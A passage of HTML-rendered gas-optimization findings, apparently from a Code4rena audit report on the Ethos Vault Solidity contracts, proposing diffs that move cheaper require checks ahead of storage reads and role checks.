0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Reorder the require statement to have the cheaper one come first</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L144-L156\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L144-L156</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"103\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReaperVaultV2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">144</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">addStrategy</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">145:        </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_strategy</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">146:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_feeBPS</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">147:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_allocBPS</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">148</span><span class=\"mtk1\">:    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">149</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">_atLeastRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">DEFAULT_ADMIN_ROLE</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">150</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(!</span><span class=\"mtk12\">emergencyShutdown</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Cannot add strategy during emergency shutdown&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">151</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_strategy</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;Invalid strategy address&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">152</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">strategies</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_strategy</span><span class=\"mtk1\">].</span><span class=\"mtk12\">activation</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Strategy already added&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">153</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">) == </span><span class=\"mtk11\">IStrategy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_strategy</span><span class=\"mtk1\">).</span><span class=\"mtk11\">vault</span><span class=\"mtk1\">(), </span><span class=\"mtk8\">&quot;Strategy&#39;s vault does not match&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">154</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">) == </span><span class=\"mtk11\">IStrategy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_strategy</span><span class=\"mtk1\">).</span><span class=\"mtk11\">want</span><span class=\"mtk1\">(), </span><span class=\"mtk8\">&quot;Strategy&#39;s want does not match&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">155</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_feeBPS</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">PERCENT_DIVISOR</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">5</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Fee cannot be higher than 20 BPS&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">156</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_allocBPS</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">totalAllocBPS</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">PERCENT_DIVISOR</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Invalid allocBPS value&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Refactor the code as follows to have the cheaper check first</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"104\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/Ethos-Vault/contracts/ReaperVaultV2.sol b/Ethos-Vault/contracts/ReaperVaultV2.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index b5f2a58..48316b9 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/Ethos-Vault/contracts/ReaperVaultV2.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/Ethos-Vault/contracts/ReaperVaultV2.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -146,13 +146,15 @@ contract ReaperVaultV2 is ReaperAccessControl, ERC20, IERC4626Events, AccessCont</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 _feeBPS,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 _allocBPS</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) external {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        require(_strategy != address(0), &quot;Invalid strategy address&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        require(_feeBPS &lt;= PERCENT_DIVISOR / 5, &quot;Fee cannot be higher than 20 BPS&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         _atLeastRole(DEFAULT_ADMIN_ROLE);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         require(!emergencyShutdown, &quot;Cannot add strategy during emergency shutdown&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        require(_strategy != address(0), &quot;Invalid strategy address&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         require(strategies[_strategy].activation == 0, &quot;Strategy already added&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         require(address(this) == IStrategy(_strategy).vault(), &quot;Strategy&#39;s vault does not match&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         require(address(token) == IStrategy(_strategy).want(), &quot;Strategy&#39;s want does not match&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        require(_feeBPS &lt;= PERCENT_DIVISOR / 5, &quot;Fee cannot be higher than 20 BPS&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         require(_allocBPS + totalAllocBPS &lt;= PERCENT_DIVISOR, &quot;Invalid allocBPS value&quot;);</span></span></span></code></pre>\n<h3 id=\"move-the-cheaper-require-check-on-top\" style=\"position:relative;\"><a href=\"#move-the-cheaper-require-check-on-top\" aria-label=\"move the cheaper require check on top permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Move the cheaper require check on top</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L178-L184\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L178-L184</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"105\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReaperVaultV2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">178</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">updateStrategyFeeBPS</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_strategy</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_feeBPS</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">179</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">_atLeastRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ADMIN</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">180</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">strategies</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_strategy</span><span class=\"mtk1\">].</span><span class=\"mtk12\">activation</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Invalid strategy address&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">181</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_feeBPS</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">PERCENT_DIVISOR</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">5</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Fee cannot be higher than 20 BPS&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">182</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">strategies</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_strategy</span><span class=\"mtk1\">].</span><span class=\"mtk12\">feeBPS</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_feeBPS</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">183</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">StrategyFeeBPSUpdated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_strategy</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_feeBPS</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">184</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<p>The require on Line 181 involves checking a function argument which is cheaper compared to it’s storage counterpart which is being checked on line 180. Refactor the code as follows to have the cheaper check first</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"106\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/Ethos-Vault/contracts/ReaperVaultV2.sol b/Ethos-Vault/contracts/ReaperVaultV2.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index b5f2a58..8532ded 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/Ethos-Vault/contracts/ReaperVaultV2.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/Ethos-Vault/contracts/ReaperVaultV2.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -176,9 +176,10 @@ contract ReaperVaultV2 is ReaperAccessControl, ERC20, IERC4626Events, AccessCont</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      * @param _feeBPS The new performance fee in basis points.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function updateStrategyFeeBPS(address _strategy, uint256 _feeBPS) external {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        require(_feeBPS &lt;= PERCENT_DIVISOR / 5, &quot;Fee cannot be higher than 20 BPS&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         _atLeastRole(ADMIN);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         require(strategies[_strategy].activation != 0, &quot;Invalid strategy address&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        require(_feeBPS &lt;= PERCENT_DIVISOR / 5, &quot;Fee cannot be higher than 20 BPS&quot;);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L319-L338\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L319-L338</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"107\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReaperVaultV2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">319</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_deposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_receiver</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">320</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">_atLeastRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">DEPOSITOR</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">321</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(!</span><span class=\"mtk12\">emergencyShutdown</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Cannot deposit during emergency shutdown&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">322</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Invalid amount&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The require on Line 322 involves checking a function argument which is cheaper compared to it’s storage counterpart which is being checked on line 321. Refactor the code as follows to have the cheaper check first</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"108\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/Ethos-Vault/contracts/ReaperVaultV2.sol b/Ethos-Vault/contracts/ReaperVaultV2.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index b5f2a58..ab8c6c3 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/Ethos-Vault/contracts/ReaperVaultV2.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/Ethos-Vault/contracts/ReaperVaultV2.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -317,9 +317,10 @@ contract ReaperVaultV2 is ReaperAccessControl, ERC20, IERC4626Events, AccessCont</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     // Internal helper function to deposit {_amount} of assets and mint corresponding</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     // shares to {_receiver}. Returns the number of shares that were minted.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function _deposit(uint256 _amount, address _receiver) internal nonReentrant returns (uint256 shares) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        require(_amount != 0, &quot;Invalid amount&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         _atLeastRole(DEPOSITOR);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         require(!emergencyShutdown, &quot;Cannot deposit during emergency shutdown&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        require(_amount != 0, &quot;Invalid amount&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span></code></pre>\n<h3 id=\"move-the-require-statement-at-the-beginning-of-the-function\" style=\"position:relative;\"><a href=\"#move-the-require-statement-at-the-beginning-of-the-function\" aria-label=\"move the require statement at the beginning of the function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Move the require statement at the beginning of the function</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol#L63-L88\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol#L63-L88</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"109\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">abstract</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReaperBaseStrategyv4</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">63</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">__ReaperBaseStrategy_init</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">64:        </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_vault</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">65:        </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_want</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">66:        </span><span class=\"mtk10\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_strategists</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">67:        </span><span class=\"mtk10\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_multisigRoles</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">68</span><span class=\"mtk1\">:    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyInitializing</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">69</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">__UUPSUpgradeable_init</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">70</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">__AccessControlEnumerable_init</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">72</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">vault</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_vault</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">73</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">want</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_want</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">74</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">IERC20Upgradeable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">want</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeApprove</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">, </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">76</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">numStrategists</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_strategists</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">77</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numStrategists</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">i</span><span class=\"mtk1\">.</span><span class=\"mtk11\">uncheckedInc</span><span class=\"mtk1\">()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">78</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">_grantRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">STRATEGIST</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_strategists</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">79</span><span class=\"mtk1\">:        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">81</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_multisigRoles</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">3</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Invalid number of multisig roles&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>As we might revert if a function argument check does not succeed, it is better to check the argument first before performing any other operations as we might waste gas doing this operations then revert on failure to meet the conditions required for the function argument</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"110\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol b/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index db020f2..7c3c5a8 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol</span></span></span>\n<span class=\"grvsc-line\"><span 